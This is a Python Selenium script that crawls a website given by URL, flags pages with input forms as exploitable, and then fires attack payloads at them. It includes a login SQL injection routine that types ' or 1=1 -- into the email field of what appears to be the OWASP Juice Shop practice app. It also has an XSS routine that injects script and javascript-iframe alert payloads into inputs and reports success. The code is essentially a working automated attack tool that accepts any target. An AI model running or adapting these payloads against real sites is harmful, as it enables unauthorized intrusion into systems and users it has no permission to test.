from time import sleep
from random import uniform
from soup_methods import find_links, find_buttons, find_inputs
from bs4 import BeautifulSoup
from init import initialize
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

def available_links(driver,site):
    domain = site.split('.')[0]
    driver.get(site)
    while len(queue) != 0 : 
        link = queue[0] 
        driver.get(f'{site}{link}')
        sleep(uniform(1.3,1.7))
        page = driver.page_source
        if '404' not in page :
            soup = BeautifulSoup(page,'html.parser')
            for ref in find_buttons(soup,queue,available):
                if ref not in queue:
                    queue.append(ref)
            for ref in find_links(soup,domain,queue,available):
                if ref not in queue:
                    queue.append(ref)
            available.add(queue.pop(0))
        else:
            queue.pop(0)

def check_form_val(driver,site):
    vulnerable_links=[]
    for link in available:
        driver.get(f'{site}{link}')
        sleep(uniform(1.5,1.8))
        page = driver.page_source
        soup = BeautifulSoup(page,'html.parser')
        if find_inputs(soup):
            print(f'{site}{link} has inputs you can exploit')
            vulnerable_links.append(link)
        else:
            print(f'{site}{link} has no input form to exploit')
    return vulnerable_links


def loginsqlinjection(site,link,driver): #check for sql injection
    driver.get(f'{site}{link}')
    sleep(2)
   # driver.find_element_by_xpath('/html/body/div[3]/div[2]/div/mat-dialog-container/app-welcome-banner/div/button[2]/span/span').click() #find login button
    driver.find_element_by_xpath('//*[@id="email"]').send_keys(" ' or 1=1 -- ")
    password=driver.find_element_by_xpath('//*[@id="password"]') 
    text='sqlinjection'
    for characters in text:
        password.send_keys(characters)
        sleep(0.3) #set username and password 
    driver.find_element_by_xpath('//*[@id="loginButton"]').click() 
    sleep(5)
    if driver.current_url=='https://juice-shop.herokuapp.com/#/search': #check if login failed 
          print("your page is vulnerable to sql injection")
    else:
        print("login failed")

def xssattack(driver,links):
    attacks = ['<script>alert("1")</script>','<iframe src="javascript:alert(`1`)">']
    for link in links:
        driver.get(f'{site}{link}')
        soup = BeautifulSoup(driver.page_source,'html.parser')
        inp = soup.find('input')
        try:
            class_name = inp['class']
            input_form = driver.find_element_by_class_name(class_name)
        except:
            id_name = inp['id']
            input_form = driver.find_element_by_id(id_name)

        flag = False
        driver.execute_script("arguments[0].click();", input_form)
        for attack in attacks:
            input_form.send_keys(attack)
            try:
                alert = WebDriverWait(driver,2).until(EC.alert_is_present())
                alert.accept()
                flag = True
            except:
                pass
        if flag == True:
            return link
    return None

if __name__ == '__main__':
    queue = list()
    available = set()
    driver = initialize()

    queue.append('/')
    available.add('/')

    site = input('Give site full url: ')

    available_links(driver,site)

    print('Available Ulrs:')
    for link in available:
        print(f'---{link}')

    print('----------------- \n')

    vulnerable_links = check_form_val(driver,site)

   # if '/login/' in  vulnerable_links: #check if link has login 
   #     loginsqlinjection(site,'/login/',driver)
    
    response = xssattack(driver,available)

    if response is None:
        print('Xss attacks failed')
    else:
        print('There are available xss attacks')